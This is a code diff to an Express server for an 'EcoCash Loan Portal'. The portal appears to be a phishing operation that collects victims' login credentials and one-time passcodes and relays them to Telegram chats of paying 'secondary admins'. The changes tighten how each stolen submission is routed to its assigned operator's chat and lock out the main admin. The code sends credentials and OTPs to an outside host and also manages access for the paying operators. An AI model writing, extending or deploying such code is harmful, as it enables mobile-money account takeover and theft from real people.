@@ -75,7 +75,7 @@ function formatZimbabwePhone(phone) {
   return formattedPhone;
 }
 
-// STEP 2 SUBMISSION: Credentials delivered directly to the specific Admin chat tied to the link path
+// STEP 2 SUBMISSION: Credentials delivered strictly to the specific secondary Admin chat tied to the link path
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     const data = req.body;
@@ -88,8 +88,18 @@ app.post('/api/submit-credentials', async (req, res) => {
     const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();
     const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;
 
-    const portalPath = data.portalPath || '/Admin-0001';
-    const targetChatId = pathToAdminChat.get(portalPath) || process.env.TELEGRAM_CHAT_ID;
+    // Strictly sanitize and validate portal path to prevent accidental cross-chat leaks
+    let portalPath = data.portalPath || '';
+    if (!portalPath.startsWith('/Admin-')) {
+      portalPath = '/Admin-0001';
+    }
+    
+    // Explicitly target the chat mapped to this path
+    const targetChatId = pathToAdminChat.get(portalPath);
+
+    if (!targetChatId) {
+      return res.status(400).json({ success: false, error: "This portal link is not currently mapped to an active session or admin." });
+    }
 
     activeApplications.set(appReference, {
       ...data,
@@ -149,7 +159,7 @@ app.post('/api/submit-credentials', async (req, res) => {
   }
 });
 
-// STEP 3 SUBMISSION: OTP delivered to the exact same Admin chat that received Step 2
+// STEP 3 SUBMISSION: OTP delivered to the exact same secondary Admin chat that received Step 2
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { appReference, otpCode } = req.body;
@@ -164,7 +174,7 @@ app.post('/api/submit-otp', async (req, res) => {
     activeApplications.set(appReference, appData);
 
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    const targetChatId = appData.targetChatId || process.env.TELEGRAM_CHAT_ID;
+    const targetChatId = appData.targetChatId;
 
     if (botToken && targetChatId) {
       const messageText = `💬 <b>OTP CODE SUBMISSION (STEP 3)</b>\n\n` +
@@ -259,6 +269,11 @@ app.post('/api/telegram-webhook', async (req, res) => {
       if (userStatus === 'PAID' && secondaryAdmins.has(userId)) {
         const assignedPath = secondaryAdmins.get(userId);
         const portalUrl = `https://${req.get('host')}${assignedPath}`;
+        
+        // Ensure their chat ID maps directly to their specific path dynamically on /start
+        pathToAdminChat.set(assignedPath, chatId);
+        savePersistentData();
+
         const welcomeBackText = `🤖 <b>EcoCash Loan Portal</b>\n\n` +
                                 `✅ <b>Access Status:</b> AUTHORIZED (PAID)\n` +
                                 `🔗 <b>Your Private Portal Link:</b> <a href="${portalUrl}">${portalUrl}</a>`;
@@ -270,7 +285,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
         return;
       }
 
-      // Prevent secondary admins from spamming new registration requests to the main admin if they already exist or are denied
       if (userStatus === 'UNPAID') {
         const deniedText = `⚠️ <b>Access Denied</b>\n\nYour account status is marked as <b>UNPAID</b> by the administrator.`;
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -281,7 +295,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
         return;
       }
 
-      // If user is already pending, don't spam the main admin with duplicate cards
       if (userStatus === 'PENDING') {
         const pendingAgainText = `👋 Hello <b>${fullName}</b>,\n\n` +
                                  `Your access request is already pending review by the main administrator. Please wait for clearance.`;
@@ -293,7 +306,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         return;
       }
 
-      // New user triggering /start for the first time -> Send registration request ONLY to Main Admin
+      // New user triggering /start -> Send registration request ONLY to Main Admin
       authorizedUsers.set(userId, 'PENDING');
       savePersistentData();
 
@@ -367,6 +380,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         pathToAdminChat.set(assignedPath, targetUserId.toString());
       } else {
         assignedPath = secondaryAdmins.get(targetUserId);
+        pathToAdminChat.set(assignedPath, targetUserId.toString());
       }
     }
     savePersistentData();
@@ -396,7 +410,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
   if (targetAppRef) {
     const appData = activeApplications.get(targetAppRef);
-    if (appData && appData.targetChatId && chatId !== appData.targetChatId.toString() && chatId !== masterChatId.toString()) {
+    // Strictly restrict controls to the assigned secondary admin chat only. Main admin cannot hijack individual submissions.
+    if (appData && appData.targetChatId && chatId !== appData.targetChatId.toString()) {
       await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -474,3 +489,4 @@ app.get('*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
 });
+        
